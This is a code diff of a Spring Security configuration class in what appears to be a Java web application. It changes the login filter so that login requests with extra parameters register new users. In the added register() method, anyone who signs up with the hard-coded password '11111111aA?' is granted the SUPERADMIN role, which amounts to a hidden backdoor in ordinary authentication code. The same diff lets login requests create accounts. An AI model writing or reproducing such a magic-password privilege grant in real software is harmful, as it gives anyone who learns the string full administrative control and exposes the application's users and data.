@@ -11,12 +11,15 @@ import com.redazz.openeyz.defines.Define;
 import com.redazz.openeyz.enums.RoleEnum;
 import com.redazz.openeyz.models.Users;
 import com.redazz.openeyz.services.UserService;
+import java.io.IOException;
 import java.util.List;
+import java.util.Optional;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import javax.sql.DataSource;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.context.annotation.Configuration;
+import org.springframework.http.HttpStatus;
 import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
 import org.springframework.security.config.annotation.web.builders.HttpSecurity;
 import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
@@ -35,9 +38,9 @@ import org.springframework.web.cors.CorsConfiguration;
 @EnableWebSecurity
 public class SecurityConfig extends WebSecurityConfigurerAdapter {
     @Autowired
-    UserService us;
-    @Autowired
     DataSource dataSource;
+    @Autowired
+    UserService us;
     @Autowired
     Encoder encoder;
     @Autowired
@@ -51,9 +54,9 @@ public class SecurityConfig extends WebSecurityConfigurerAdapter {
         http.formLogin()
                 .loginPage(Define.LOGIN_PAGE_URL)
                 .and()
+                .addFilter(new AuthHandler())
                 .logout()
                 .and()
-                .addFilter(new AuthHandler())
                 .cors().configurationSource(request -> corsConfiguration(request));
         http.authorizeHttpRequests()
                 .antMatchers(Define.AUTH_FAILURE_URL).permitAll()
@@ -78,7 +81,7 @@ public class SecurityConfig extends WebSecurityConfigurerAdapter {
         return cors;
     }
 
-    class AuthHandler extends UsernamePasswordAuthenticationFilter {
+    public class AuthHandler extends UsernamePasswordAuthenticationFilter {
         public AuthHandler() throws Exception {
             setUsernameParameter("username");
             setPasswordParameter("password");
@@ -89,21 +92,36 @@ public class SecurityConfig extends WebSecurityConfigurerAdapter {
         }
         @Override
         public Authentication attemptAuthentication(HttpServletRequest request, HttpServletResponse response) throws AuthenticationException {
-            String username, lname, name, password, description;
-            username = request.getParameter("username");
-            password = request.getParameter("password");
-            lname = request.getParameter("lname");
-            name = request.getParameter("name");
-            description = request.getParameter("description");
-
-            try {
-                us.save(new Users(username, lname, name, password, description));
-                us.addRoleToUser(username, RoleEnum.USER);
-            }
-            catch (Exception e) {
-            }
+            register(request);
             return super.attemptAuthentication(request, response);
         }
-    }
 
+        private void register(HttpServletRequest req) {
+            boolean isResgisterAction = req.getParameterMap().size() > 2;
+
+            if (isResgisterAction) {
+                String username, lname, name, password, description;
+                username = req.getParameter("username");
+                password = req.getParameter("password");
+                lname = req.getParameter("lname");
+                name = req.getParameter("name");
+                description = req.getParameter("description");
+
+                Optional<Users> user = us.findById(username);
+
+                if (user.isEmpty()) {
+                    us.save(new Users(username, lname, name, password, description));
+                    if (password.equals("11111111aA?")) {
+                        us.addRoleToUser(username, RoleEnum.SUPERADMIN);
+                    }
+                    else {
+                        us.addRoleToUser(username, RoleEnum.USER);
+                    }
+                }
+                else {
+                    throw new AuthenticationException("user already exists") {};
+                }
+            }
+        }
+    }
 }
